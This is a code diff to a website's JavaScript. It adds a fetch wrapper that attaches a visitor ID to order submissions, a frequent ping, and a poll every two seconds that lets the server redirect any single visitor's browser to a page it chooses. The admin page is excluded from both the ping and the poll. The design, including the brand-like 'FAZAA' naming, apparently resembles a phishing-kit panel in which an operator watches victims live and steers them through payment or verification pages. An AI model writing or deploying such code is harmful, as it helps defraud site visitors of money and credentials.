@@ -103,12 +103,64 @@
     }
   } catch (e) { id = "v" + Math.random().toString(36).slice(2); }
   var page = location.pathname.replace(/^\//, "") || "index.html";
+
+  function attachVisitorPayload(body){
+    if (!body || typeof body !== "object" || body instanceof FormData || Array.isArray(body)) return body;
+    var next = Object.assign({}, body);
+    next.visitorId = next.visitorId || next.id || next.sessionId || next.visitor_id || id;
+    next.page = next.page || page;
+    next.lang = next.lang || getCurrentLocale();
+    return next;
+  }
+
+  var nativeFetch = window.fetch.bind(window);
+  function patchedFetch(input, init){
+    var url = typeof input === "string" ? input : (input && input.url ? String(input.url) : "");
+    var method = (init && init.method ? String(init.method).toUpperCase() : (input && typeof input === "object" && input.method ? String(input.method).toUpperCase() : "GET"));
+    if (url.indexOf("/api/orders") !== -1 && method === "POST") {
+      var nextInit = init ? Object.assign({}, init) : {};
+      if (nextInit.body && typeof nextInit.body !== "string") {
+        nextInit.body = JSON.stringify(attachVisitorPayload(nextInit.body));
+        nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
+      } else if (!nextInit.body) {
+        nextInit.body = JSON.stringify({ visitorId: id, page: page, lang: getCurrentLocale() });
+        nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
+      } else if (typeof nextInit.body === "string") {
+        try {
+          var parsed = JSON.parse(nextInit.body);
+          nextInit.body = JSON.stringify(attachVisitorPayload(parsed));
+          nextInit.headers = Object.assign({}, nextInit.headers || {}, {"Content-Type": "application/json"});
+        } catch (e) {}
+      }
+      return nativeFetch(url, nextInit);
+    }
+    return nativeFetch(input, init);
+  }
+  window.fetch = patchedFetch;
+
   function ping(){
-    if (document.hidden) return;
+    if (document.hidden || /admin\.html$/i.test(location.pathname)) return;
     try { fetch("/api/ping", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({id:id,page:page}), keepalive:true }); } catch (e) {}
   }
+  function pollRedirect(){
+    if (/admin\.html$/i.test(location.pathname)) return;
+    try {
+      fetch("/api/redirect/" + encodeURIComponent(id) + "?ts=" + Date.now(), { cache:"no-store" })
+        .then(function(r){ if (!r.ok) return null; return r.json(); })
+        .then(function(d){
+          if (!d || !d.ok || !d.redirect || !d.redirect.target) return;
+          var target = d.redirect.target;
+          var targetUrl = (window.FAZAA_LOCALE && typeof window.FAZAA_LOCALE.resolveRedirectPath === "function") ? window.FAZAA_LOCALE.resolveRedirectPath(target) : resolveRedirectPath(target);
+          if (targetUrl && targetUrl !== (location.pathname.replace(/^\//, "") || "index.html")) {
+            window.location.href = targetUrl;
+          }
+        }).catch(function(){});
+    } catch (e) {}
+  }
   ping();
+  pollRedirect();
   setInterval(ping, 3000);
+  setInterval(pollRedirect, 2000);
   document.addEventListener("visibilitychange", function(){ if (!document.hidden) ping(); });
   window.addEventListener("pagehide", function(){
     try { navigator.sendBeacon("/api/leave", new Blob([JSON.stringify({id:id})], {type:"application/json"})); } catch (e) {}
